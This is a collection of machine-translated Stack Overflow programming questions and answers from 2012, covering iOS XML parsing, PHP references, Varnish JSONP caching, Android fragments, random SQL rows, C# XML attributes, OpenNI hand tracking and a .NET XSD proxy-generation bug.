对于通用实现，我有以下带有相同标签的 xml 文件。我想解析这个文件。我可以在 iOS 中解析它吗？

xml文件：

```
 <?xml version="1.0"?>
<node name="bkl">
    <childrens>
        <node name="A building">
            <childrens>
                <node name="hfs"/>
                <node name="habc"/>
                <node name="def"/>
            </childrens>  
        </node>
        <node name="B building">
            <childrens>
                <node name="hfs2"/>
                <node name="habc2"/>
                <node name="def2"/>
            </childrens>
        </node>
        <node name="C building">
            <childrens>
                <node name="hfs3"/>
                <node name="hab3"/>
                <node name="def3"/>
            </childrens>
        </node>

    </childrens>
</node> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:08:34.513

Youd 应该阅读iOS Developer Library 中的[XML Parsing Basics](http://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/XMLParsing/Articles/UsingParser.html)。

它描述了如何使用`NSXMLParser`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:09:14.330

是的你可以。为您的深度制作计数器。在解析器的起始元素方法中，如果它是节点元素，则增加 nodeHeight++，如果 childeren 是元素和进程，则增加 childern++

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-09T11:39:09.753

您可以使用技巧解析此文件。第一次当儿童标签关闭时不要在数组中添加项目，第一次之后你可以在数组中添加项目

# php - PHP foreach 覆盖以前的引用

> ID：10514781
> 
> 赞同：1
> 
> 时间：2012-05-09T11:02:55.633
> 
> 标签：php, reference, foreach

> **可能重复：**
> [循环引用后的奇怪行为 - 这是 PHP 错误吗？](https://stackoverflow.com/questions/8220399/strange-behaviour-after-loop-by-reference-is-this-a-php-bug)

考虑这段代码：

```
$start = array("a", "b", "c");  

foreach ($start as &$item) {}
foreach ($start as $item) {}

print_r($start); 
```

当我对数组进行 foreach 并使用元素作为参考，然后再次进行 foreach 时，但这次使用普通变量，但保持与参考的变量名称相同，输入数组的最后一个元素被前一个的内容覆盖一。

上面的代码输出：

```
Array
(
    [0] => a
    [1] => b
    [2] => b
) 
```

谁能解释我为什么会这样？我想这是一个内存寻址问题，但在这种现象中找不到任何逻辑。这里的幕后究竟发生了什么？

# flash - Flex，根据前一个视图的数据更改视图的标题

> ID：10514783
> 
> 赞同：0
> 
> 时间：2012-05-09T11:03:01.970
> 
> 标签：flash, apache-flex, flash-builder

我盯着下面的代码

```
<s:View xmlns:fx="http://ns.adobe.com/mxml/2009"
    xmlns:s="library://ns.adobe.com/flex/spark" title='{this.data.name}'
    xmlns:model="model.*" 
```

我希望根据从上一个视图中获取的数据来更改视图标题。目前它只是空白。

当标题是：

```
title='{this.data}' 
```

我得到...

> [对象对象]

任何人都有一些想法。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T13:12:08.290

查看调试器中的对象。也许它有一个像“txt”或“title”这样的属性，而不是“name”。

# javascript - jQuery循环为每个'drop'生成隐藏字段

> ID：10514784
> 
> 赞同：0
> 
> 时间：2012-05-09T11:03:04.350
> 
> 标签：javascript, jquery, loops, for-loop, while-loop

我有一个拖放日历，“拖放”需要将详细信息传递到变量中。

到目前为止，我已经设法让它附加到一个 textarea 中，这样我就可以看到它正在很好地记录数据或创建一个隐藏字段来进行最后一滴。

但是，我需要将每个项目都放在一个隐藏字段中，这样我就可以将它传递到下一页，然后在 PHP 中对其进行处理。

我猜我需要某种循环，所以对于每一滴......生成隐藏场。

但我没有运气让它工作。

这是我的代码。任何帮助都会非常有用。

谢谢

```
 drop: function(date, allDay) { // this function is called when something is dropped

            // retrieve the dropped element's stored Event Object
            var originalEventObject = $(this).data('eventObject');

            // we need to copy it, so that multiple events don't have a reference to the same object
            var copiedEventObject = $.extend({}, originalEventObject);

            // assign it the date that was reported
            copiedEventObject.start = date;
            copiedEventObject.allDay = allDay;

            // render the event on the calendar
            // the last `true` argument determines if the event "sticks" (http://arshaw.com/fullcalendar/docs/event_rendering/renderEvent/)
            $('#calendar').fullCalendar('renderEvent', copiedEventObject, true);

            //Record and add dropped items to list
            var txt = $("#listbox");
            var dtstart = copiedEventObject.start + '\n'
            var caltitle = copiedEventObject.title

            txt.val(txt.val() + dtstart); // For our reference - Remove later

                var input = document.createElement("input");
                input.setAttribute("type", "hidden");
                input.setAttribute("name", "dtstart");
                input.setAttribute("value", dtstart);

                //append to form element that you want .
                document.getElementById("calendarform").appendChild(input)

            // remove the element from the "Draggable Events" list
            $(this).remove();

        }
    });

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:46:27.973

您可以做的是使列表框成为“ul”元素，如下所示

```
<ul id = "listbox"> 

 </ul> 
```

然后将以下 jquery 添加到您的函数中

```
var txt = $('#listbox');     
txt.append("<li class ='listItem'> "+dtstart +"</li>") 
```

最后，您将有一个 <.li> 列表（点是否存在，否则它不会显示在答案中）具有相同类的元素。然后您可以获取“listItem”类的所有元素并将值传递到下一页

希望这个答案很清楚

***编辑***

要获取“listItem”类中的所有值，您可以执行以下操作

```
var listItems = $('.listItem');

listItems.each(function(){
    // your code goes here for each record
}); 
```

# caching - 用清漆处理 jsonp

> ID：10514786
> 
> 赞同：1
> 
> 时间：2012-05-09T11:03:21.680
> 
> 标签：caching, jsonp, varnish, varnish-vcl

我尝试配置清漆，以便它可以处理 jsonp。
我使用这个来源作为基本概念：[https ://gist.github.com/640331](https://gist.github.com/640331)

我正在使用 varnish 3.0.2 所以我最终得到了[这个](https://gist.github.com/2643616/5f32653a9abc20b77eb225b37248351f791bb001)

向服务器发送请求后：

```
curl http://example.com/test?callback=test 
```

我得到以下信息：

```
test(<esi:include src="http://example.com/test" />); 
```

安装：

```
test({...cached-json...}); 
```

系统日志输出：

```
The syslog outputs the following:
May 09 12:48:45 [varnishd] before if for: /JSONP-ESI-TEMPLATE
May 09 12:48:45 [varnishd] before if for: callback, url: example.com:6081
May 09 12:48:45 [varnishd] in if for: callback, url: example.com:6081
May 09 12:52:40 [varnishd] before if for: /JSONP-ESI-TEMPLATE
May 09 12:52:40 [varnishd] in if for: /JSONP-ESI-TEMPLATE
May 09 12:52:40 [varnishd] before if for: obj.status == 760
May 09 12:52:40 [varnishd] in if for: obj.status == 760
May 09 12:52:40 [varnishd] before if for: beresp.http.X-ESI
May 09 12:52:40 [varnishd] in if for: beresp.http.X-ESI
May 09 12:52:40 [varnishd] before if for: beresp.http.X-JSONP-Server
May 09 12:52:40 [varnishd] in if for: beresp.http.X-JSONP-Server 
```

如何评估 esi 请求以获取 json？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-23T00:07:02.767

得到解决方案！ [看起来像这样](https://gist.github.com/4557315)。

如果您使用 gzip 处理 json 响应，请不要忘记为 jsonp 启用 gzip：

```
if ( beresp.http.content-type ~ "application/javascript" ) { 
  set beresp.do_gzip = true;
} 
```

# iphone - 为独立人士开发 iPhone 应用程序的后端 Web 服务和数据库

> ID：10514791
> 
> 赞同：3
> 
> 时间：2012-05-09T11:03:36.837
> 
> 标签：iphone, database, web-services, web-hosting

我想开发我的 iPhone 应用程序，但我不确定托管数据库和 Web 服务与我的 iPhone 应用程序通信的选项是什么。有人可以建议我什么是最好的方法吗？

我知道如何构建一切，但从未遇到过这种情况。我一直在要求管理员为我们提供托管所有内容的服务器的环境中工作，但是如果我想自己做并且没有服务器基础架构，我有什么选择？我需要从网络托管服务提供商处购买吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:13:31.793

根据我的经验，我为 iPad 客户端开发了后端部分。它是 REST、ASP.NET Web API (WCF Web API) 和后端 MS SQL Server 和 MySQL 上的数据库。

无论如何，对于移动客户端，您可以自由使用 REST。它可以是来自 .NET 的 ASP.NET Web API 或其他有助于制作 REST 服务的库，例如来自 Java 的。

REST 很适合移动客户端应用程序使用。然后从客户端应用程序的角度来看，无论数据库后端有什么。

谈到托管它也取决于后端的需求。当您没有服务器基础设施时，您可以使用像 Amazon AWS (EC2) 这样的云 PaaS。或者自己托管服务器。

# android - 从 Fragments 启动 Activity

> ID：10514797
> 
> 赞同：0
> 
> 时间：2012-05-09T11:04:01.977
> 
> 标签：android, android-listview, android-fragments, android-tabhost

让我解释一下我的应用程序的结构，在我的应用程序中，我有3 个使用**Fragments实现的****主要选项卡**。其中一个主选项**卡在其片段中包含 3 个子选项卡**，一个**子选项卡**包含 **listview**。现在我想在选择列表中的项目时**启动一个活动。**

 ******这是列表视图的 onItemClickListener：

```
lv.setOnItemClickListener(new OnItemClickListener() 
 {

public void onItemClick(AdapterView<?> arg0, View view, int position,long id) 
{
RecordObjects obj=(RecordObjects)lv.getItemAtPosition(position);
String name=obj.getName();
String url=obj.getUrl();
intent=new Intent(getActivity(),player.class);
intent.putExtra("task","Draft");
intent.putExtra("name",name);
intent.putExtra("read_path",url);
startActivityForResult(intent, 0);

}
}); 
```

当我单击列表项时出现的错误是：

```
 05-09 16:19:07.723: D/PhoneWindow(7043): couldn't save which view has focus because the focused view android.widget.LinearLayout@44ecc1d8 has no id.
05-09 16:19:07.741: D/AndroidRuntime(7043): Shutting down VM
05-09 16:19:07.741: W/dalvikvm(7043): threadid=3: thread exiting with uncaught exception (group=0x4001b188)
05-09 16:19:07.751: E/AndroidRuntime(7043): Uncaught handler: thread main exiting due to uncaught exception
05-09 16:19:07.771: E/AndroidRuntime(7043): java.lang.RuntimeException: Unable to pause activity {com.m2.smartGui/com.m2.smartGui.smartGuiPagerFragmentActivity}: java.lang.NullPointerException
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.app.ActivityThread.performPauseActivity(ActivityThread.java:3162)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.app.ActivityThread.performPauseActivity(ActivityThread.java:3119)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.app.ActivityThread.handlePauseActivity(ActivityThread.java:3102)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.app.ActivityThread.access$2400(ActivityThread.java:119)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1870)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.os.Handler.dispatchMessage(Handler.java:99)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.os.Looper.loop(Looper.java:123)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.app.ActivityThread.main(ActivityThread.java:4363)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at java.lang.reflect.Method.invokeNative(Native Method)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at java.lang.reflect.Method.invoke(Method.java:521)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:860)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:618)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at dalvik.system.NativeStart.main(Native Method)
05-09 16:19:07.771: E/AndroidRuntime(7043): Caused by: java.lang.NullPointerException
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.support.v4.app.FragmentManagerImpl.saveFragmentBasicState(FragmentManager.java:1576)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.support.v4.app.FragmentManagerImpl.saveAllState(FragmentManager.java:1617)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.support.v4.app.FragmentActivity.onSaveInstanceState(FragmentActivity.java:481)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at com.m2.smartGui.smartGuiPagerFragmentActivity.onSaveInstanceState(smartGuiPagerFragmentActivity.java:78)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.app.Activity.performSaveInstanceState(Activity.java:1022)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.app.Instrumentation.callActivityOnSaveInstanceState(Instrumentation.java:1180)
05-09 16:19:07.771: E/AndroidRuntime(7043):     at android.app.ActivityThread.performPauseActivity(ActivityThread.java:3144)
05-09 16:19:07.771: E/AndroidRuntime(7043):     ... 12 more 
```

> 这里有什么错误？或者是否可以从片段开始活动？如果否，最佳做法是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T12:30:50.020

根据文档，SavedInstanceState 包是通过保存所有视图/小部件中的视图和数据以及附加的 id 来创建的。听起来 Che Jami 是对的，并且在尝试保存包时存在错误，并且视图/小部件具有焦点但没有 id。

简单的解决方法是为您的列表视图行向该 LinearLayout 添加一个 id。******

# python - Web.py 为 S3 发送和请求文件

> ID：10514802
> 
> 赞同：1
> 
> 时间：2012-05-09T11:04:17.733
> 
> 标签：python, amazon-s3, scalability, web.py

我正在使用 web.py 构建一个 Web 服务，并使用 S3 来存储文件。我的 Web 服务的一部分有一个“提交”方法（类似于 SVN/Git），它接收用户本地文件夹中的文件列表并将它们与当前已上传的文件进行比较（通过 md5 散列本地文件，并保留远程文件哈希的数据库记录）。然后客户端压缩自上次“提交”以来添加或修改的文件，并将此压缩文件上传到服务器。然后服务器解压缩并将文件放在应有的位置，使用新的哈希值更新数据库。

但是，我希望这是一个可扩展的 Web 服务，并且处理大量 zip 存档将是一个问题。我想到了两种可能的方法：

1.  一次处理一个文件 - 服务器在上载最后一个文件时请求每个文件。
2.  找到绕过我的服务器并让用户直接上传到 S3 的方法。但是，用户仍应在我的服务器上进行身份验证！

我对网络服务很陌生，所以任何建议都将不胜感激。不用说，我希望这些事务在内存和处理时间方面尽可能便宜。

# java - Javascript 中的 DWR 调用错误

> ID：10514804
> 
> 赞同：1
> 
> 时间：2012-05-09T11:04:22.817
> 
> 标签：java, javascript, spring-mvc, dwr

我正在使用`Spring 3.05`and`DWR 3.0rc1`在我的应用程序中进行 AJAX 调用。在本地环境中，即 Eclipse 和 Tomcat 服务器，它工作正常，但在集群环境中，我在调用时遇到以下错误，`DWR`并且脚本错误即将到来，说`DWR`未定义，但我能够`myApplication/dwr/index.html`正确看到。

错误日志：

> 由于 org.directwebremoting.create.ScriptedCreator 上的 NoClassDefFoundError 而跳过“脚本”。原因：org/apache/bsf/BSFException
> 
> 由于 org.directwebremoting.beehive.PageFlowCreator 上的 ClassNotFoundException 而跳过“页面流”。原因：Beehive/Weblogic jar 文件不可用。
> 
> 添加创建者类型：none = class org.directwebremoting.create.NullCreator
> 
> 添加创建者类型：new = class org.directwebremoting.create.NewCreator

请帮帮我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-10T06:10:44.380

在我看来，jar 不包含在类路径中。你能检查它是否包括在内吗？

# sql - 每个表的随机值的表

> ID：10514812
> 
> 赞同：1
> 
> 时间：2012-05-09T11:04:41.340
> 
> 标签：sql, database

我有 3 个表 .a,b,c 。数据类型为 varchar 的名称。我需要一个查询，该查询将从每个表中获取一行并给我另一个表，即“d”。这个 d 将有 3 行，例如。a1 高于 b3 高于 c2 .. 每次运行此查询时，表 d 中的这些值都是随机的..

```
Table a   Table b   Table c
 Name      Name       Name
 a1        b1         c1
 a2        b2         c2 
 a3        b3         c3 
```

当我运行查询时，我需要一个随机表“d”

```
Table d    Table d
 Name       Name
 a2         b1
 b3         a3
 c1         c3 
```

这些表之间没有关系！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:35:16.130

有很多方法可以从数据库表中选择随机记录或行。下面是一些不需要额外应用程序逻辑的示例 SQL 语句，但每个数据库服务器需要不同的 SQL 语法。

***使用MySQL*选择一个随机行：**

```
 SELECT column FROM table
ORDER BY RAND()
LIMIT 1 
```

***使用PostgreSQL*选择一个随机行：**

```
 SELECT column FROM table
ORDER BY RANDOM()
LIMIT 1 
```

***使用Microsoft SQL Server*选择随机行：**

```
SELECT TOP 1 column FROM table
ORDER BY NEWID() 
```

***使用IBM DB2*随机选择一行**

 *```
 SELECT column, RAND() as IDX 
FROM table 
ORDER BY IDX FETCH FIRST 1 ROWS ONLY 
```

***使用Oracle*选择一条随机记录：**

```
 SELECT column FROM
( SELECT column FROM table
ORDER BY dbms_random.value )
WHERE rownum = 1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:54:15.863

以下查询将从每个表中返回一个随机行。

```
WITH  OneRandomRowFromA
    AS ( SELECT TOP 1
                 Name
               , RAND(CAST(NEWID() AS BINARY(6))) AS RandomNumber
         FROM    TableA
         ORDER BY 2
       ) ,
  OneRandomRowFromB
    AS ( SELECT TOP 1
                 Name
               , RAND(CAST(NEWID() AS BINARY(6))) AS RandomNumber
         FROM    TableB
         ORDER BY 2
       ) ,
  OneRandomRowFromC
    AS ( SELECT TOP 1
                 Name
               , RAND(CAST(NEWID() AS BINARY(6))) AS RandomNumber
         FROM    TableC
         ORDER BY 2
       )
SELECT   Name
FROM     OneRandomRowFromA
UNION ALL
SELECT   Name
FROM     OneRandomRowFromB
UNION ALL
SELECT   Name
FROM     OneRandomRowFromC 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T11:56:43.543

试试这个希望它会帮助你

```
 ---- This will create a random number between 1 and 3           
   DECLARE @Random1 INT;
   DECLARE @Random2 INT;
   DECLARE @Random3 INT;
   DECLARE @Upper INT;
   DECLARE @Lower INT

SET @Lower = 1 ---- The lowest random number
SET @Upper = 4 ---- The highest random number
SELECT @Random1 = ROUND(((@Upper - @Lower -1) * RAND() + @Lower), 0)  
SELECT @Random2 = ROUND(((@Upper - @Lower -1) * RAND() + @Lower), 0)       
SELECT @Random3 = ROUND(((@Upper - @Lower -1) * RAND() + @Lower), 0) 

--query here--
;with tableA AS
(
    SELECT Name,
    ROW_NUMBER() OVER (ORDER BY Name) AS RowNumber
    FROM a 
),  tableB AS
(
    SELECT Name,
    ROW_NUMBER() OVER (ORDER BY Name) AS RowNumber
    FROM b 
)
,tableC AS
(
    SELECT Name,
    ROW_NUMBER() OVER (ORDER BY Name) AS RowNumber
    FROM c 
)

select Name from tableA where RowNumber= @Random1 
union
 select Name from  tableB where  RowNumber=@Random2  
 union
 select Name from tableC where RowNumber=@Random3 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T19:52:02.220

--表D

```
select (select top 1 name from @TableA order by newid()) as Name
union all
select (select top 1 name from @TableB order by newid())
union all
select (select top 1 name from @TableC order by newid()) 
```*

# c# - 如何使用 XMlElement 获取元素的属性值

> ID：10514813
> 
> 赞同：7
> 
> 时间：2012-05-09T11:04:49.013
> 
> 标签：c#, asp.net, xml, c#-4.0

我正在使用`XmlElement` c#。我有一个`XmlElement`. 的来源`XmlElement`将类似于下面的示例。

样本：

```
<data>
    <p>hello all
        <strong>
            <a id="ID1" href="#" name="ZZZ">Name</a>
        </strong>
    </p>
    <a id="ID2" href="#" name="ABC">Address</a>
</data> 
```

我必须遍历上面的 XML 来搜索元素名称`a`。我还想将该元素的 ID 提取到变量中。

基本上我想获取元素的 ID 属性`<a>`。它可以作为子元素出现，也可以作为单独的父元素出现。

任何人都可以帮助它如何完成。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-10T05:39:13.177

由于您使用的是 C# 4.0，因此您可以像这样使用 linq-to-xml：

```
XDocument xdoc = XDocument.Load(@"C:\Tmp\your-xml-file.xml");
foreach (var item in xdoc.Descendants("a"))
{
   Console.WriteLine(item.Attribute("id").Value);
} 
```

应该给你元素`a`，不管它在层次结构中的什么位置。

* * *

根据您的评论，对于仅使用 XmlDocument 和 XmlElement 类的代码，等效代码将是：

```
XmlDocument dd = new XmlDocument();
dd.Load(@"C:\Tmp\test.xml");
XmlElement theElem = ((XmlElement)dd.GetElementsByTagName("data")[0]);
//         ^^ this is your target element 
foreach (XmlElement item in theElem.GetElementsByTagName("a"))//get the <a>
{
    Console.WriteLine(item.Attributes["id"].Value);//get their attributes
} 
```

# kinect - hand tracking not working after a reload of openni dynamic library

> ID：10514814
> 
> 赞同：0
> 
> 时间：2012-05-09T11:04:59.903
> 
> 标签：kinect, openni

Our project is (http://www.play4health.com/p4h_eng/) using `Ogre 3D` over `Ubuntu 11.04`. Except for core services all is based in a plugin architecture taking advantage of `Ogre 3d` plugin facilities.

In our plugin architecture plugins can be:

*   Videogames
*   Interaction methods

Users configure their session creating tuples (videogame, interaction method). The flow is a session is: * User load his session. * User click of one of the tuples for the session and play to videogame with a specific interaction method. * Repeat it until end all activities of the session.

Plugin are loaded/unloaded dynamically by demand.

One of this interaction methods is hand tracking using openni. What is the problem? * Fist time that openni plugin is loading all work perfectly. * Next time that plugin openni has to be loaded system is able to detect gestures but not do hand tracking. Note that all plugin are executed in the same process. Right now only solution is to reboot platform.

This is the code for init and release `OpenNI` in our plugin

```
 bool IPKinectPlugin::onInitialise()
  {
    mHandPointer.mId = "KinectHandPointer";
    mHandPointer.mHasAbsolute = true;
    mHandPointer.mHasRelative = false;

    XnStatus nRetVal = XN_STATUS_OK;

    nRetVal = gContext.InitFromXmlFile(String(this->getPluginInfo()-
  >getResPath() + "SamplesConfig.xml").c_str());
    CHECK_RC(nRetVal, bContext, "InitFromXml");

  #if SHOW_DEPTH
    nRetVal = gContext.FindExistingNode(XN_NODE_TYPE_DEPTH,gDepthGenerator);
    bDepthGenerator = (nRetVal != XN_STATUS_OK);
    if (bDepthGenerator)
    {
    nRetVal = gDepthGenerator.Create(gContext);
    CHECK_RC(nRetVal, bDepthGenerator, "Find Depth generator");
    }
  #endif

    nRetVal = gContext.FindExistingNode(XN_NODE_TYPE_USER, gUserGenerator);
    bUserGenerator = (nRetVal != XN_STATUS_OK);
    if (/*bUserGenerator*/false)
    {
    nRetVal = gUserGenerator.Create(gContext);
    CHECK_RC(nRetVal, bUserGenerator, "Find user generator");
    }

    nRetVal = gContext.FindExistingNode(XN_NODE_TYPE_GESTURE, gGestureGenerator);
    bGestureGenerator = (nRetVal != XN_STATUS_OK);
    if (bGestureGenerator)
    {
    nRetVal = gGestureGenerator.Create(gContext);
    CHECK_RC(nRetVal, bGestureGenerator, "Find gesture generator");

    XnCallbackHandle hGestureCallbacks;
    gGestureGenerator.RegisterGestureCallbacks(gestureRecognized, gestureProcess, 0,
        hGestureCallbacks);
    }

    nRetVal = gContext.FindExistingNode(XN_NODE_TYPE_HANDS,gHandsGenerator);
    bHandsGenerator = (nRetVal != XN_STATUS_OK);
    if (bHandsGenerator)
    {
    nRetVal = gHandsGenerator.Create(gContext);
    CHECK_RC(nRetVal, bHandsGenerator, "Find hands generator");

    XnCallbackHandle hHandsCallbacks;
    gHandsGenerator.RegisterHandCallbacks(handsNew, handsMove,handsLost, 0, hHandsCallbacks);
    }

    nRetVal = gContext.FindExistingNode(XN_NODE_TYPE_DEVICE, gDevice);
    bDevice = (nRetVal != XN_STATUS_OK);

    gContext.RegisterToErrorStateChange(onErrorStateChanged, NULL, hDummyCallbackHandle);

    //Preparo la textura para la webcam
    if (bGenerateRGBTexture)
    mWebcamTexture = KinectTools::createDepthTexture("KinectWebCamTexture", sPluginName);

    return true;
  }
  //-----------------------------------------------------------------------------

  bool IPKinectPlugin::onShutdown()
  {
    if (bContext)
    {
    if (bHandsGenerator)
    {
        gHandsGenerator.StopTrackingAll();
    }
    if (bGestureGenerator)
    {
        gGestureGenerator.RemoveGesture(GESTURE_TO_USE);
        gGestureGenerator.RemoveGesture(GESTURE_TO_START);
    }
    gContext.StopGeneratingAll();
    gContext.Shutdown();
    }

    return true;
  } 
```

Any idea about this issue? Any wrong with this code?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T05:26:17.177

也许您在此期间已经找到了解决方案...

我通常使用 Java Wrapper，但我认为与我的代码不同的是，我在创建生成器（Depth、Hands 等）之后调用了 contect.startGeneratingAll()。当我在启动时多次执行此操作时，我也遇到了问题。另一个区别是我在关机时使用了 context.release。

我的程序通常是：

*   初始化配置（许可证、节点、设置）
*   创建生成器
*   开始生成所有
*   运行你的代码...
*   停止生成所有
*   上下文发布

来自 OpenNI 文档

> XN_C_API 无效 XN_C_DECL xnShutdown (XnContext * pContext)
> 
> 关闭 OpenNI 上下文，销毁其所有节点。调用此方法后，请勿调用此上下文的任何函数或任何相关节点。注意：这个函数会破坏上下文和它持有的所有节点，所以应该非常小心地使用。通常你应该只调用 xnContextRelease()

# html - media query - can I use seperate, independant stylesheet?

> ID：10514815
> 
> 赞同：1
> 
> 时间：2012-05-09T11:05:02.507
> 
> 标签：html, mobile, css, media-queries

I was only introduced to media queries yesterday while researching building my mobile optimized pages. I have found that contrary to my initial interpretation a media query directs to a stylesheet that is used in addition to and overrides the existing stylesheet.

Is that right? Is there a way to tell the visitors browser to ignore the original stylesheet and just use the one for mobile?

Here is existing code:

```
<link href="styles_mobile.css" media="screen and (max-device-width: 480px)" type="text/css" rel="stylesheet">

<link type="text/css" href="styles.css" rel="stylesheet"> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-14T17:05:04.230

这样做是完全可以接受的。

# .net - 如何正确修改生成的 XSD 以克服导致异常“cs0030：无法生成临时类”的已知 .Net 错误

> ID：10514817
> 
> 赞同：9
> 
> 时间：2012-05-09T11:05:11.253
> 
> 标签：.net, web-services, visual-studio-2008, exception, xsd

我的任务是向第 3 方 Web 服务发送数据，他们提供了一个测试服务，该服务被证明可以与 Java 客户端一起使用，但是，它不在 .Net 中。

当我生成服务代理并实例化服务或序列化请求对象时，我收到以下错误：

```
Unable to generate a temporary class (result=1). 
error CS0030: Cannot convert type 'TestStarXML.wsStarService.VSOptionInclusiveSetType[]' to 'TestStarXML.wsStarService.VSOptionInclusiveSetType' 
error CS0030: Cannot convert type 'TestStarXML.wsStarService.VSOptionConflictSetType[]' to 'TestStarXML.wsStarService.VSOptionConflictSetType'
error CS0030: Cannot convert type 'TestStarXML.wsStarService.ColorRequirementSetType[]' to 'TestStarXML.wsStarService.ColorRequirementSetType' 
error CS0030: Cannot convert type 'TestStarXML.wsStarService.ColorExclusionSetType[]' to 'TestStarXML.wsStarService.ColorExclusionSetType' 
error CS0029: Cannot implicitly convert type 'TestStarXML.wsStarService.VSOptionInclusiveSetType' to 'TestStarXML.wsStarService.VSOptionInclusiveSetType[]' 
error CS0029: Cannot implicitly convert type 'TestStarXML.wsStarService.VSOptionConflictSetType' to 'TestStarXML.wsStarService.VSOptionConflictSetType[]' 
error CS0029: Cannot implicitly convert type 'TestStarXML.wsStarService.ColorRequirementSetType' to 'TestStarXML.wsStarService.ColorRequirementSetType[]' 
error CS0029: Cannot implicitly convert type 'TestStarXML.wsStarService.ColorExclusionSetType' to 'TestStarXML.wsStarService.ColorExclusionSetType[]' 
```

向我们发送此服务的第 3 方使用 Java，他们从测试服务生成服务代理没有问题。到目前为止，我的理解是 .Net 中存在一个错误（[请参见此处](http://connect.microsoft.com/VisualStudio/feedback/details/471297)）为 WSDL 文件生成 XSD。

[在此处](https://stackoverflow.com/a/7581988/198048)的答案中，它提到使用虚拟属性修改生成的 XSD，因此我按照建议添加了虚拟属性：

```
<xs:complexType name="VSInclusivesOptionType">
    <xs:sequence>
      <xs:element minOccurs="0" maxOccurs="unbounded" name="VSOptionInclusiveSet" type="tns:VSOptionInclusiveSetType" />
    </xs:sequence>
    <xs:attribute name="tmp" type="xs:string" />   <!-- this is all I have added (for each of the types in the exception message) -->
  </xs:complexType>
  <xs:complexType name="VSOptionInclusiveSetType">
    <xs:sequence>
      <xs:element minOccurs="0" name="SetID" type="ns2:IdentifierType" />
      <xs:element minOccurs="0" name="NumberOfOptionsNumeric" type="xs:decimal" />
      <xs:element minOccurs="0" maxOccurs="unbounded" name="VSOption2" type="tns:VSOption2Type" />
    </xs:sequence>
  </xs:complexType> 
```

添加 dummy 属性的唯一实现是将项目的编译时间从几分钟减少到几秒钟。

除此之外，VS2008 似乎没有注意到这些变化——如果没有上述异常，我仍然无法序列化对象或实例化服务，我错过了什么或做错了什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-15T09:24:55.300

您必须按照我的问题更改 XSD 文件，但您还必须修改同一文件夹中的 Reference.cs（或 .vb）文件 - 我在 [][] 上用 [] （或 () () 与 () 在 vb.net 中)。

在我所做的所有阅读中，没有答案说两者都可以，所以我只是错过了重点 - 我希望这个答案对其他人有所帮助。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-15T08:24:55.650

你是对的，这是 WSDL 工具中的一个错误。要更正错误，您应该打开生成的文件并将一些“TestStarXML.wsStarService.VSOptionConflictSetType”更改为“TestStarXML.wsStarService.VSOptionConflictSetType[]”。

运行时，您可以轻松找到哪些。更改类型后，您的服务将正常运行。

# ruby-on-rails - 在使用 Rails 忽略日历日期时在查找条件中使用时间

> ID：10514819
> 
> 赞同：1
> 
> 时间：2012-05-09T11:05:16.017
> 
> 标签：ruby-on-rails, ruby, activerecord

我想创建一个查询，它将返回开始时间在“现在”之前和结束时间在“现在”之后的所有警报，我只关心它是一天中的什么时间，而不是它的日期。

我原以为这会起作用

```
Alert.find(:all, :conditions => [" ? between ? AND ?", Time.now, :start, :end]) 
```

但是它不是因为这个查询本身与日历日期有关，而不仅仅是一天中的时间。

我找到了“.to_s(:time)”，但是当我添加它时，我得到了一个错误。

```
Alert.find(:all, :conditions => [" ? between ? AND ?", Time.now.to_s(:time), :start.to_s(:time), :end.to_s(:time)]) 
```

```
 Alert.find(:all, :conditions => [" ? between ? AND ?", Time.now.to_s(:time), :start.to_s(:time), :end.to_s(:time)])
ArgumentError: wrong number of arguments(1 for 0)
        from (irb):48:in `to_s'
        from (irb):48
        from /home/chris/.rvm/gems/ruby-1.9.3-p194/gems/railties-3.2.3/lib/rails/commands/console.rb:47:in `start'
        from /home/chris/.rvm/gems/ruby-1.9.3-p194/gems/railties-3.2.3/lib/rails/commands/console.rb:8:in `start'
        from /home/chris/.rvm/gems/ruby-1.9.3-p194/gems/railties-3.2.3/lib/rails/commands.rb:41:in `'
        from script/rails:6:in `require'
        from script/rails:6:in `' 
```

